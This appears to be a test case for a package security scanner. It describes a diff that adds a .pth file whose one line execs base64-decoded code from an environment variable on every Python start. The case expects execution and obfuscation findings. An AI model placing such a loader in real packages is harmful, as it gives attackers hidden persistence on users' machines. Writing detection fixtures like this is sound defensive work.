@@ -1,0 +1,9 @@
+kind = "risky"
+title = "Package ships a .pth file that runs code on every Python start"
+source = "synthetic; persistence technique used by several malicious PyPI packages"
+expect = ["EXE006 src/fastlogging_init.pth:1", "OBF005 src/fastlogging_init.pth:1"]
+
+[[file]]
+path = "src/fastlogging_init.pth"
+status = "added"
+added = ["import os, base64; exec(base64.b64decode(os.environ.get('FL_CFG', 'cGFzcw==')))"]
